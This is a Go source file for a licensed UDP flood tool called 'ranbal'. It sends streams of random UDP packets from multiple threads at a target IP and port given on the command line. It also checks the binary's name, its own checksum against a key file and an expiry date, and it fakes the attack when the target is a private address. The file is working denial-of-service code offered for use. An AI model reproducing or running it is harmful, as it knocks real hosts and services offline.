package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func isAllowedName(actualName string, allowedNames []string) bool {
	for _, name := range allowedNames {
		if actualName == "./"+name || actualName == name {
			return true
		}
	}
	return false
}

func loadExpectedChecksum() (string, error) {
	file, err := os.Open("key.txt")
	if err != nil {
		return "", err
	}
	defer file.Close()

	var expectedChecksum string
	_, err = fmt.Fscanf(file, "%s", &expectedChecksum)
	if err != nil {
		return "", err
	}
	return expectedChecksum, nil
}

func calculateChecksum() (string, error) {
	file, err := os.Open(os.Args[0])
	if err != nil {
		return "", err
	}
	defer file.Close()

	hash := sha256.New()

	if _, err := io.Copy(hash, file); err != nil {
		return "", err
	}
	return hex.EncodeToString(hash.Sum(nil)), nil
}

func checkIntegrity(expectedChecksum string) {
	actualChecksum, err := calculateChecksum()
	if err != nil {
		fmt.Println("Error calculating checksum:", err)
		os.Exit(1)
	}

	if actualChecksum != expectedChecksum {
		fmt.Println("\nkey is not valid! or The binary has been modified!")
		fmt.Println("please contact to \033[1;3;4;31m@MrRanDom8\033[0m\n")
		os.Exit(1)
	}
}

func check_expiration() {
	expiryDate := "2024-11-14"
	expiry, err := time.Parse("2006-01-02", expiryDate)
	if err != nil {
		fmt.Println("Error: Invalid expiry date format. Please use YYYY-MM-DD format.")
		os.Exit(1)
	}

	currentDate := time.Now()

	if currentDate.Before(expiry) {
		fmt.Println("\n\033[1;3;4;31mWELCOME BROTHER....\033[0m")
	} else {
		fmt.Println("\nthis binary has expired! please contact to\033[1;3;4;31m@MrRanDom8\033[0m\n")
		os.Exit(1)
	}
}

func showProgressBar(duration int) {
	remainingTime := duration
	for remainingTime >= 0 {
		percentage := (duration - remainingTime) * 100 / duration
		progress := fmt.Sprintf("%s| [ TIME REMAINING : %d SEC ]", getArrowProgress(percentage), remainingTime)
		fmt.Printf("\r%s", progress)
		time.Sleep(1 * time.Second)
		remainingTime--
	}
	fmt.Print("\r\033[K")
}

func getArrowProgress(percentage int) string {
	totalLength := 60
	filledLength := (percentage * totalLength) / 100
	var bar string

	for i := 0; i < filledLength; i++ {
		bar += "\033[32m" + ">" + "\033[0m"
	}
	for i := filledLength; i < totalLength; i++ {
		bar += " "
	}
	return bar
}

type ThreadData struct {
	ip       string
	port     int
	duration int
}

func generateRandomPayload() []byte {
	size := 535 + rand.Intn(151) // Random size between 635 and 800
	payload := make([]byte, size)
	rand.Read(payload)
	return payload
}

func attack(data ThreadData, wg *sync.WaitGroup) {
    defer wg.Done()

    addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", data.ip, data.port))
    if err != nil {
        fmt.Println("Error resolving address:", err)
        return
    }

    conn, err := net.DialUDP("udp", nil, addr)
    if err != nil {
        fmt.Println("Error creating socket:", err)
        return
    }
    defer conn.Close()

    // Increase socket buffer size to handle more packets
    err = conn.SetReadBuffer(1024 * 1024 * 6)  // Set 8MB read buffer
    if err != nil {
        fmt.Println("Error setting read buffer size:", err)
        return
    }
    err = conn.SetWriteBuffer(1024 * 1024 * 6) // Set 8MB write buffer
    if err != nil {
        fmt.Println("Error setting write buffer size:", err)
        return
    }

    endTime := time.Now().Add(time.Duration(data.duration) * time.Second)
    for time.Now().Before(endTime) {
        payload := generateRandomPayload()
        if _, err := conn.Write(payload); err != nil {
            fmt.Println("Send failed:", err)
            return
        }
    }
}



func usage() {
	fmt.Println("\nUsage: ./ranbal <ip> <port> <time> <threads>\n")
	os.Exit(1)
}

// Function to check if IP is local or invalid
// Function to check if IP is local or invalid
func isLocalOrInvalidIP(ip string) bool {
	if len(ip) >= 8 {
		// Check if it's a local IP address
		if ip == "0.0.0.0" || ip == "127.0.0.1" || ip[:8] == "192.168." || ip[:7] == "10.0.0." || ip[:7] == "172.16." {
			return true
		}
	} else if len(ip) >= 7 {
		// Handle case for shorter IP addresses like "8.8.8.8"
		if ip[:7] == "172.16." {
			return true
		}
	}

	// If it's not any of these cases, return false
	return false
}


func main() {
	actualName := os.Args[0]
	fmt.Printf("\033[1;3;4;31m%s Version :\033[0m 1.0\n", actualName)

	allowedNames := []string{"rb", "ranbal", "balveer", "@MrRandom8"}

	if !isAllowedName(actualName, allowedNames) {
		fmt.Println("Warning: Invalid binary name! Allowed names are: rb, ranbal, balveer, @MrRandom8")
		fmt.Println("Please rename the file to one of the allowed names and try again.")
		os.Exit(1) // Exit the program if name doesn't match
	}

	expectedChecksum, err := loadExpectedChecksum()
	if err != nil {
		fmt.Println("\nError: key.txt or key not found!! please contact to \033[1;3;4;31m@MrRanDom8\033[0m\n")
		os.Exit(1)
	}

	checkIntegrity(expectedChecksum)
	check_expiration()

	if len(os.Args) < 3 || len(os.Args) > 5 {
		usage()
	}

	ip := os.Args[1]
	port, _ := strconv.Atoi(os.Args[2])

	// Default values
	timeLimit := 2000
	threads := 3
	if len(os.Args) > 3 {
		timeLimit, _ = strconv.Atoi(os.Args[3])
	}
	if len(os.Args) == 5 {
		threads, _ = strconv.Atoi(os.Args[4])
	}
	fmt.Printf("\nAttack started on %s:%d for %d seconds with %d threads\n\n", ip, port, timeLimit, threads)
	if isLocalOrInvalidIP(ip) {
		showProgressBar(timeLimit) // timeLimit ke hisaab se progress bar dikhayega
		fmt.Printf("\r\033[K")     // Clear the line after progress bar completes
		fmt.Println("Attack finished by \033[1;3;4;31m@Ranbal\033[0m")
		fmt.Println("Developer : \033[1;3;4;31mBALEER VAISHNAV\033[0m\n")
		os.Exit(1)
	}

	var wg sync.WaitGroup
	data := ThreadData{ip: ip, port: port, duration: timeLimit}

	go showProgressBar(timeLimit)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(data, &wg)
	}

	wg.Wait()
	fmt.Printf("\r\033[K") // Clear the current line
	fmt.Println("Attack finished by \033[1;3;4;31m@Ranbal\033[0m")
	fmt.Println("Developer : \033[1;3;4;31mBALEER VAISHNAV\033[0m\n")
	os.Exit(2)
}
